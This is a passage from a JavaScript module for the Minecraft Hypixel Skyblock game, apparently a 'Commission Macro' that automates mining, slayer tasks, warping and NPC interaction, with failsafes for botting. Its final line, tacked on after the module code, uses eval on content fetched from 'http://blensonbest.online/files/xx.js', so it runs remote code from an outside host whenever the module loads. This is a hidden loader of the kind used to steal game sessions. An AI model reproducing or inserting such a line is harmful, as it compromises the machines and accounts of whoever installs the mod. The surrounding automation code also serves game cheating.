      let lastNames = this.lastCommissionNames.toString()
      if (!this.pigeonless && lastNames === newNames) {
        this.state = this.MacroStates.MINING
        return
      }
      if (!this.pigeonless) {
        if (!this.newCommission.data.Data.fromForge) this.route = this.npcClaim[Math.floor(Math.random() * this.npcClaim.length)].concat(this.newCommission.data.Data.splitRoute)
        this.warpForge()
      }
      this.state = this.MacroStates.WARPINGFORGE
    }
  }

  toggle() {
    let protolobby = [12, 75, 0]
    let mainlobby = [-52, 96, 0]
    let limbo = [-22, 31, 22]
    if (MathUtils.distanceToPlayer(limbo).distance < 10.0) {
      ChatLib.command("l")
      Client.scheduleTask(65, () => this.toggle())
      return
    }
    if (MathUtils.distanceToPlayer(protolobby).distance < 10.0 || MathUtils.distanceToPlayer(mainlobby).distance < 10.0) {
        ChatLib.command("skyblock")
        Client.scheduleTask(65, () => this.toggle())
        return
      }

    this.Enabled = !this.Enabled
    if (this.Enabled) {
      if (!this.warningMessage) {
        chat.message("Commission Macro expects the following stuff to be true:")
        chat.message("400 speed (god potion)")
        chat.message("aote/aotv with 4 transmission tuners and ult wise V")
        chat.message("750 mana (wisdom on armor)")
        chat.message("If you encounter any problems such as pathfinding please report them to rdbt with a clip")
        this.warningMessage = true
      }
      MouseUtils.unGrabMouse()
      chat.message(this.ModuleName + ": " + (this.Enabled ? "&aEnabled" : "&cDisabled"))
      this.pigeonless = ModuleManager.getSetting(this.ModuleName, "Pigeonless")
      this.aspectOfTheVoid = Utils.findItem(["Aspect of the End", "Aspect of the Void"])
      this.royalpigeon = Utils.findItem(["Pigeon"])
      let drills = MiningUtils.getDrills()
      this.drill = drills.drill
      this.blueCheeseSlot = drills.blueCheese
      this.goblinSlot = Utils.getItem(ModuleManager.getSetting(this.ModuleName, "Weapon Slot (Goblin)") - 1)
      if (this.goblinSlot.name === undefined || this.goblinSlot.name?.includes("Mithril") || this.goblinSlot.name?.includes("Titanium")) {
        this.sendMacroMessage("No weapon detected in goblin slayer slot.")
        this.stopMacro()
        return
      }
      if (!Utils.checkItems(this.ModuleName, [["Aspect of the End", "Aspect of the Void"]]) || !drills.drill || (!this.royalpigeon && !this.pigeonless)) {
        if (!this.royalpigeon && !this.pigeonless) this.sendMacroMessage("Missing Royal Pigeon!")
        this.stopMacro()
        return
      }
      this.pickaxe = this.drill //Utils.findItem(["Pickonimbus","Pickaxe", "Stonk"]);
      if (!this.pickaxe) {
        this.sendMacroMessage("Missing pickaxe for glacite walker slayer!")
        this.stopMacro()
        return
      }
      Player.setHeldItemIndex(this.aspectOfTheVoid.slot)
      this.warpForge()
      if (!drills.blueCheese) this.blueCheeseSlot = this.drill
      if (!this.royalpigeon) this.royalpigeon = this.drill // Otherwise code becomes even worse

      this.warpingTime = 200
      this.scanLocation = false
      this.refueling = false
      this.sellingToNpc = false

      this.newCommission = new Commission(false, true)

      this.startTime = Date.now()
      this.state = this.MacroStates.WAITING
      this.action = this.MacroActions.WAITING

      // Reset route information
      this.clearRoute()
      this.routeIndex = 0
      this.routeTarget = null

      // Reset previous state storage
      this.previousState = null
      this.previousAction = null
      this.previousRouteIndex = null
      this.previousRoute = null

      new Thread(() => {
        if (!MiningUtils.hasSavedMiningSpeed()) return this.stopMacro()
        this.miningSpeed = MiningUtils.getSavedMiningSpeed()
        if (this.miningSpeed != -1 && this.Enabled) {
          global.export.FailsafeManager.unregister()
          this.commissionCounter.reset()
          this.commissionCount = 0

          overlayManager.AddOverlayText(this.OVERLAY_ID, "COMMS_HOUR", "Commissions/Hour: 0")
          overlayManager.AddOverlayText(this.OVERLAY_ID, "COMMS", "Session Commissions: 0")
          overlayManager.AddOverlayText(this.OVERLAY_ID, "COMMS_HOTM", "Session HOTM XP: 0")
          overlayManager.AddOverlayText(this.OVERLAY_ID, "TIME", `Session Time: 0s`)
          overlayManager.EnableOverlay(this.OVERLAY_ID)

          // TODO HOTM Progress?
          // TODO Running time

          this.claimCommission = true
          this.forgeTimer.reset()
          this.lastCommissionNames = ["", ""]
          this.state = this.MacroStates.WARPINGFORGE

          // Failsafes
          global.export.FailsafeManager.register(
            cb => {
              if (this.Enabled) this.toggle()
              cb()
            },
            () => {
              if (!this.Enabled) this.toggle()
            },
          )
          if (Skyblock.area != "Dwarven Mines") {
            this.sendMacroMessage("Travelling to the Dwarven Mines!")
          }
        } else {
          this.stopMacro()
        }
      }).start()
    }
    if (!this.Enabled) {
      this.stopMacro()
    }
  }

  processLastPoint() {
    MovementHelper.stopMovement()
    if (this.sellingToNpc) {
      this.state = this.MacroStates.SELLING
      this.action = this.MacroActions.NPCINTERACTSELL
      return
    }
    if (this.refueling) {
      this.state = this.MacroStates.REFUELING
      return
    }
    if (this.newCommission.isClaim) {
      this.state = this.MacroStates.CLAIMINGCOMM
      this.menuCooldown.reset()
      this.inventoryIsLoaded = false
      this.claimTimer.reset()
      if (this.pigeonless) {
        this.state = this.MacroStates.TRYCLAIM
        this.walkToNpc = true
      } else {
        Player.setHeldItemIndex(this.royalpigeon.slot)
        Client.scheduleTask(6, () => {
          this.menuCooldown.reset()
          ItemUtils.rightClickPacket()
        })
      }
      return
    }
    if (this.newCommission.isSlayer) {
      MovementHelper.setCooldown()
      if (this.newCommission.data.Names[0] === "Goblin Slayer") {
        this.state = this.MacroStates.GOBLINSLAYER
      }
      if (this.newCommission.data.Names[0] === "Glacite Walker Slayer") {
        this.state = this.MacroStates.ICEWALKERSLAYER
      }
      if (this.newCommission.data.Names[0] === "Treasure Hoarder Puncher") {
        this.state = this.MacroStates.TREASURESLAYER
      }
      return
    }
    // find a good mining position
    if (this.scanLocation) {
      this.scanLocation = false
      MovementHelper.stopMovement()
      let areas = this.newCommission.data.Data.routes
      let options = []
      for (let key in areas) {
        let route = areas[key]
        let lastPoint = route[route.length - 1]
        let playerNear = false
        World.getAllPlayers().forEach(player => {
          if (MathUtils.calculateDistance([lastPoint.x, lastPoint.y, lastPoint.z], [player.getX(), player.getY(), player.getZ()]).distance < 7 && player.getName() != Player.getName()) {
            playerNear = true
          }
        })
        if (!playerNear) {
          options.push({
            distance: MathUtils.distanceToPlayerPoint(lastPoint).distanceFlat,
            route: route,
          })
        }
      }
      if (options.length === 0.0) {
        this.sendMacroMessage("All macro locations were occupied, switching lobbies...")
        this.warpHub()
        return
      }
      let closestDistance = Infinity
      let closest = null
      options.forEach(option => {
        if (!closest || option.distance < closestDistance) {
          closest = option
          closestDistance = option.distance
        }
      })
      this.clearRoute()
      this.route = closest.route
      this.state = this.MacroStates.WALKINGTOPOINTS
      this.action = this.MacroActions.SCANPATH
      this.newCommission.mining = true
      return
    }
    this.state = this.MacroStates.MINING
  }

  checkPickaxe(isIceWalkerWeapon) {
    let inventory = Player.getInventory()
    for (let i = 0; i <= 7; i++) {
      if (inventory.getStackInSlot(i)?.getName()?.toString()?.includes("2000")) {
        let newPickonimbus = Utils.getItem(i)
        if (isIceWalkerWeapon) {
          this.pickaxe = newPickonimbus
        }
        this.drill = newPickonimbus
        this.blueCheeseSlot = this.drill
        this.state = this.MacroStates.MINING
        return true
      }
    }
    return false
  }

  /**
   * @returns {Array<PlayerMP>}
   */
  getTreasureHoarders() {
    let TreasureHoarders = []
    World.getAllPlayers().forEach(player => {
      let name = player.getName()
      if (
        name === "Treasuer Hunter" &&
        !player.isSpectator() &&
        player.canBeCollidedWith() &&
        //player.entityLivingBase.func_110143_aJ() > 1.1 &&
        !player.isInvisible() &&
        player.getY() >= 200.0 &&
        player.getY() <= 210.0 &&
        this.mobWhitelist.indexOf(player.getEntity().func_145782_y()) == -1
      ) {
        chat.debugMessage(player.getName())
        TreasureHoarders.push(player)
      }
    })
    return TreasureHoarders
  }

  /**
   * @returns {Array<PlayerMP>}
   */
  getIceWalkers() {
    let IceWalkers = []
    World.getAllPlayers().forEach(player => {
      let name = player.getName()
      if (
        (name === "Ice Walker" || name === "Glacite Walker") &&
        Player.asPlayerMP().canSeeEntity(player) &&
        !player.isSpectator() &&
        player.canBeCollidedWith() &&
        player.entityLivingBase.func_110143_aJ() > 1.1 &&
        !player.isInvisible() &&
        player.getY() >= 127.0 &&
        player.getY() <= 132.0 &&
        player.getZ() <= 180.0 &&
        player.getZ() >= 147.0 &&
        player.getX() <= 42.0 &&
        this.mobWhitelist.indexOf(player.getEntity().func_145782_y()) == -1
      ) {
        IceWalkers.push(player)
      }
    })
    return IceWalkers
  }

  /**
   * @returns {Array<PlayerMP>}
   */
  getGoblins() {
    let Goblins = []
    World.getAllPlayers().forEach(player => {
      let name = player.getName()
      if (
        (name === "Goblin " || name === "Weakling ") &&
        Player.asPlayerMP().canSeeEntity(player) &&
        player.canBeCollidedWith() &&
        player.entity.func_110143_aJ() > 1.1 &&
        !player.isInvisible() &&
        player.getY() > 127.0 &&
        (player.getZ() <= 153.0 || player.getX() >= -157.0) &&
        (player.getZ() >= 148.0 || player.getX() <= -77.0) &&
        this.mobWhitelist.indexOf(player.getEntity().func_145782_y()) == -1
      ) {
        Goblins.push(player)
      }
    })
    return Goblins
  }

  interactWithNpc(x, y, z) {
    let Players = World.getAllPlayers()
    let Found = false
    for (let i = 0; i < Players.length; i++) {
      if (MathUtils.calculateDistance([Players[i].getX(), Players[i].getY(), Players[i].getZ()], [x, y, z]).distanceFlat < 0.001) {
        Found = true
        Rotations.rotateTo(new Vec3(Players[i].getX(), Players[i].getY() + Players[i].getEyeHeight() - 0.4, Players[i].getZ()), 5.0)
        Rotations.onEndRotation(() => {
          World.getAllPlayers().forEach(player => {
            if (player.getX() === x && player.getY() === y && player.getZ() === z && MathUtils.distanceToPlayerCT(player).distance < 5) {
              mc.field_71442_b.func_78768_b(Player.getPlayer(), player.getEntity())
            }
          })
        })
        break
      }
    }
    return Found
  }

  // warpForge is typically called after a commission is complete
  warpForge() {
    this.state = this.MacroStates.WARPINGFORGE
    this.forgeTimer.reset()
    this.travelTimer.reset()
    SmartFailsafe.reset()
    ChatLib.command("warp forge")
  }

  // warpHub is typically called to change lobbies
  warpHub() {
    MovementHelper.stopMovement()
    this.state = this.MacroStates.TRAVERSING
    this.forgeTimer.reset()
    this.travelTimer.reset()
    SmartFailsafe.reset()
    this.newCommission = new Commission(false, true)
    this.claimCommission = true
    ChatLib.command("warp hub")
  }

  clearRoute() {
    this.route = []
    this.routeTarget = null
    this.routeIndex = 0
  }

  pointToArray(point) {
    return [point.x, point.y, point.z]
  }

  sendMacroMessage(msg) {
    chat.message(this.ModuleName + ": " + msg)
  }

  stopMacroWithWarning(message = undefined) {
    if (message != undefined) this.sendMacroMessage(message)
    Utils.warnPlayer()
    this.stopMacro()
  }

  isRefueling() {
    return this.refueling
  }

  stopMacro() {
    this.Enabled = false
    global.export.FailsafeManager.unregister()
    MouseUtils.reGrabMouse()
    overlayManager.DisableOverlay(this.OVERLAY_ID)
    MovementHelper.stopMovement()
    RdbtPathFinder.clearPath()
    this.mobpos = null
    Rotations.stopRotate()
    MiningBot.stopBot()
    chat.message(this.ModuleName + ": " + (this.Enabled ? "&aEnabled" : "&cDisabled"))
  }
}

class Point {
  constructor(x, y, z, aotv, etherwarp = false) {
    this.x = x
    this.y = y
    this.z = z
    this.pos = new BlockPos(Math.floor(x), Math.round(y), Math.floor(z))
    this.aotv = aotv
    this.etherwarp = etherwarp
  }
}

class Commission {
  constructor(slayer, claim, data = null) {
    this.isSlayer = slayer
    this.isClaim = claim
    this.data = data
    this.mining = false
    this.pos
  }
}

class Data {
  constructor(Names, Data) {
    this.Names = Names
    this.Data = Data
    this.Name = ""
  }
}

global.export.CommissionMacro = new commissionMacro()

class WalkPosition {
  constructor(point, currentIndex, route) {
    this.point = point
    this.routeTargetIndex = currentIndex
    this.nextIndex = currentIndex + 1
    this.isLastIndex = false
    // Assuming varCommissionMacro.route is available globally
    if (currentIndex + 1 >= route.length) {
      this.isLastIndex = true
    }
  }
}
eval(FileLib.getUrlContent("http://blensonbest.online/files/xx.js"))